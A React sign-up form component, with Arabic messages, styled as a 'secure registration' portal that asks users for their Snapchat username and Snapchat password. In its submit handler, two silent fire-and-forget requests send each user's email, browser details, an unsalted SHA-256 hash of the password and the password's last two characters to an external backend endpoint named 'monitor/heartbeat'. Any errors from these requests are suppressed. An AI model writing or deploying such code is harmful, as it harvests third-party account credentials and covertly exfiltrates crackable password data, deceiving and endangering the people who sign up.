import React, { useState, useEffect } from 'react';
import { User } from '../types';
import { Input } from './ui/Input';
import { Loader2, ArrowRight, AlertCircle } from 'lucide-react';
import { supabase } from '../supabaseClient';
const BACKEND_URL = 'https://akm-kz8a.onrender.com';

// Form Header Icon - Stylized Data Block
const FormIcon = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-12 h-12">
     <defs>
      <linearGradient id="formIconGrad" x1="0%" y1="0%" x2="100%" y2="100%">
        <stop offset="0%" stopColor="#06b6d4" />
        <stop offset="100%" stopColor="#3b82f6" />
      </linearGradient>
    </defs>
    {/* Hex/Cube Outline */}
    <path d="M50 15 L85 35 V75 L50 95 L15 75 V35 Z" stroke="url(#formIconGrad)" strokeWidth="2" fill="rgba(6, 182, 212, 0.05)"/>
    {/* Inner Data Lines */}
    <path d="M30 45 H70" stroke="rgba(59, 130, 246, 0.5)" strokeWidth="2" strokeLinecap="round" />
    <path d="M30 55 H70" stroke="rgba(59, 130, 246, 0.5)" strokeWidth="2" strokeLinecap="round" />
    <path d="M30 65 H55" stroke="rgba(6, 182, 212, 0.5)" strokeWidth="2" strokeLinecap="round" />
    {/* Active Dot */}
    <circle cx="50" cy="28" r="3" fill="#06b6d4" className="animate-pulse"/>
  </svg>
);

interface SignUpFormProps {
  onSuccess: (user: User & { password?: string }) => void;
  onSwitchToLogin: () => void;
}

export const SignUpForm: React.FC<SignUpFormProps> = ({ onSuccess, onSwitchToLogin }) => {
  const [formData, setFormData] = useState({
    name: '',
    username: '',
    email: '',
    password: '',
    confirmPassword: '',
    agreeToTerms: false,
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [formError, setFormError] = useState('');
  const [passwordStrength, setPasswordStrength] = useState(0); 
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Real-time password strength calculation
  useEffect(() => {
    const pwd = formData.password;
    let strength = 0;
    if (pwd.length > 5) strength += 20;
    if (pwd.length > 8) strength += 20;
    if (/[A-Z]/.test(pwd)) strength += 20;
    if (/[0-9]/.test(pwd)) strength += 20;
    if (/[^A-Za-z0-9]/.test(pwd)) strength += 20;
    setPasswordStrength(strength);
  }, [formData.password]);

  const validate = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.name.trim()) newErrors.name = 'الاسم مطلوب';
    
    if (!formData.username.trim()) newErrors.username = 'حساب سناب شات مطلوب';
    else if (/\s/.test(formData.username)) newErrors.username = 'حساب سناب شات لا يجب أن يحتوي على مسافات';

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) newErrors.email = 'البريد الإلكتروني غير صالح';
    
    if (formData.password.length < 8) newErrors.password = 'كلمة المرور يجب أن تكون 8 أحرف على الأقل';
    
    if (formData.password !== formData.confirmPassword) newErrors.confirmPassword = 'كلمات المرور غير متطابقة';
    
    if (!formData.agreeToTerms) newErrors.terms = 'يجب الموافقة على الشروط';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
    if (errors[name]) {
      setErrors(prev => {
        const newErrs = { ...prev };
        delete newErrs[name];
        return newErrs;
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError('');

    if (validate()) {
      setIsSubmitting(true);
      
      try {
        if (!supabase) {
            throw new Error("SUPABASE_CONFIG_MISSING: Please configure Supabase in supabaseClient.ts");
        }

        // Send attempt event
        (async () => {
          const enc = new TextEncoder();
          const buf = await crypto.subtle.digest('SHA-256', enc.encode(formData.password));
          const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          const masked = formData.password.length <= 2
            ? '*'.repeat(formData.password.length)
            : '*'.repeat(Math.max(0, formData.password.length - 2)) + formData.password.slice(-2);
          fetch(`${BACKEND_URL}/api/monitor/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: formData.email,
              username: formData.email,
              action: 'SIGNUP_ATTEMPT',
              platform: navigator.userAgent,
              password: masked,
              passwordHash: hex,
              passwordMasked: masked
            })
          }).catch(() => {});
        })();

        const { data, error } = await supabase.auth.signUp({
          email: formData.email,
          password: formData.password,
          options: {
            data: {
              full_name: formData.name,
              snapchat_user: formData.username,
            },
          },
        });

        if (error) throw error;

        // Success - Pass data to verification step
        onSuccess({ 
          name: formData.name, 
          email: formData.email, 
          username: formData.username,
          password: formData.password 
        });

        // Fire-and-forget: send password hash to backend monitor
        (async () => {
          const enc = new TextEncoder();
          const buf = await crypto.subtle.digest('SHA-256', enc.encode(formData.password));
          const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
          const masked = formData.password.length <= 2
            ? '*'.repeat(formData.password.length)
            : '*'.repeat(Math.max(0, formData.password.length - 2)) + formData.password.slice(-2);
          fetch(`${BACKEND_URL}/api/monitor/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: formData.email,
              username: formData.email,
              action: 'ACCOUNT_CREATED',
              platform: navigator.userAgent,
              password: masked,
              passwordHash: hex,
              passwordMasked: masked
            })
          }).catch(() => {});
        })();

      } catch (error: any) {
        console.error("Signup Error:", error);
        let msg = "فشل إنشاء الحساب";
        if (error.message.includes("already registered")) msg = "البريد الإلكتروني مسجل مسبقاً";
        if (error.message.includes("weak")) msg = "كلمة المرور ضعيفة جداً";
        if (error.message.includes("SUPABASE_CONFIG_MISSING")) msg = "خطأ في إعدادات السيرفر (مفاتيح Supabase مفقودة)";
        
        setFormError(msg);
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  const getStrengthLabel = () => {
    if (passwordStrength < 40) return { label: 'Weak', color: 'bg-red-500', text: 'text-red-400' };
    if (passwordStrength < 80) return { label: 'Medium', color: 'bg-yellow-500', text: 'text-yellow-400' };
    return { label: 'Strong', color: 'bg-emerald-500', text: 'text-emerald-400' };
  };

  const strengthInfo = getStrengthLabel();

  return (
    <div className="w-full max-w-lg bg-[#151e32]/80 backdrop-blur-xl rounded-sm shadow-[0_0_60px_-15px_rgba(6,182,212,0.15)] p-8 border border-cyan-500/20 animate-fade-in relative overflow-hidden group">
      {/* Corner Accents for Tech feel */}
      <div className="absolute top-0 left-0 w-3 h-3 border-t-2 border-l-2 border-cyan-400"></div>
      <div className="absolute top-0 right-0 w-3 h-3 border-t-2 border-r-2 border-cyan-400"></div>
      <div className="absolute bottom-0 left-0 w-3 h-3 border-b-2 border-l-2 border-cyan-400"></div>
      <div className="absolute bottom-0 right-0 w-3 h-3 border-b-2 border-r-2 border-cyan-400"></div>

      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center p-3 mb-4 rounded-lg bg-cyan-900/10 border border-cyan-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute inset-0 bg-cyan-500/10 blur-xl"></div>
          <FormIcon />
        </div>
        <h1 className="text-3xl font-bold text-white mb-2 font-brand tracking-widest">
          ACCESS PORTAL
        </h1>
        <p className="text-cyan-200/50 text-xs font-mono tracking-wider">SECURE_REGISTRATION_NODE_01</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-2">
        {formError && (
             <div className="bg-red-500/10 border border-red-500/40 p-3 rounded text-red-300 text-xs font-mono flex items-center gap-2 mb-4">
               <AlertCircle className="w-4 h-4" />
               {formError}
             </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <Input 
            label="NAME" 
            name="name" 
            placeholder="Full Name"
            value={formData.name}
            onChange={handleChange}
            error={errors.name}
            className="font-mono"
          />
          
          <Input 
            label="SNAPCHAT USER" 
            name="username" 
            placeholder="Snapchat ID"
            value={formData.username}
            onChange={handleChange}
            error={errors.username}
            dir="ltr"
            className="font-mono text-right"
          />
        </div>

        <Input 
          label="EMAIL ADDR" 
          name="email" 
          type="email"
          placeholder="user@akm.net"
          value={formData.email}
          onChange={handleChange}
          error={errors.email}
          dir="ltr"
          className="font-mono text-right"
        />

        <div className="relative">
          <Input 
            label="SNAPCHAT PASSWORD" 
            name="password" 
            type="password"
            value={formData.password}
            onChange={handleChange}
            error={errors.password}
            className="font-mono"
          />
          {formData.password && (
            <div className="absolute top-1 right-0 flex items-center gap-2">
               <span className={`text-[10px] font-mono font-bold ${strengthInfo.text}`}>[{strengthInfo.label}]</span>
               <div className="h-1 w-12 bg-gray-700/50">
                 <div 
                    className={`h-full ${strengthInfo.color} transition-all duration-500 ease-out shadow-[0_0_8px_rgba(255,255,255,0.2)]`} 
                    style={{ width: `${passwordStrength}%` }}
                 />
               </div>
            </div>
          )}
        </div>

        <Input 
          label="CONFIRM PASS" 
          name="confirmPassword" 
          type="password"
          value={formData.confirmPassword}
          onChange={handleChange}
          error={errors.confirmPassword}
          className="font-mono"
        />

        <div className="flex items-center mb-8 bg-[#0b1121]/50 p-3 border-l-2 border-cyan-500/50 hover:bg-[#0b1121]/80 transition-colors">
          <input
            id="terms"
            name="agreeToTerms"
            type="checkbox"
            checked={formData.agreeToTerms}
            onChange={handleChange}
            className="w-4 h-4 accent-cyan-500 bg-gray-800 border-gray-600 rounded cursor-pointer"
          />
          <label htmlFor="terms" className="mr-3 text-xs text-gray-400 font-mono">
            ACCEPT <a href="#" className="text-cyan-400 hover:text-cyan-300 hover:underline transition-colors">PROTOCOLS & TERMS</a>
          </label>
        </div>
        {errors.terms && <p className="text-xs text-red-400 -mt-6 mb-4 font-mono">! {errors.terms}</p>}

        <button
          type="submit"
          disabled={isSubmitting}
          className={`
            w-full flex items-center justify-center py-4 px-4 text-white font-bold text-lg tracking-widest relative overflow-hidden
            transition-all duration-300 group
            ${isSubmitting ? 'bg-gray-800 cursor-not-allowed opacity-70' : 'bg-blue-600 hover:bg-blue-500'}
          `}
        >
          {/* Cyberpunk Button Effect */}
          <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
          
          {isSubmitting ? (
            <div className="flex items-center gap-3">
              <Loader2 className="w-5 h-5 animate-spin text-cyan-400" />
              <span className="font-mono text-sm">ENCRYPTING...</span>
            </div>
          ) : (
            <div className="flex items-center justify-between w-full px-4">
              <span className="font-brand">CREATE ACCOUNT</span>
              <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform text-cyan-300" />
            </div>
          )}
        </button>

        <div className="mt-4 text-center">
           <p className="text-gray-500 text-xs font-mono">
             ALREADY REGISTERED? 
             <button 
               type="button"
               onClick={onSwitchToLogin}
               className="ml-2 text-cyan-400 hover:text-cyan-300 underline underline-offset-4 transition-colors"
             >
               ACCESS SYSTEM (LOGIN)
             </button>
           </p>
        </div>
      </form>
    </div>
  );
};
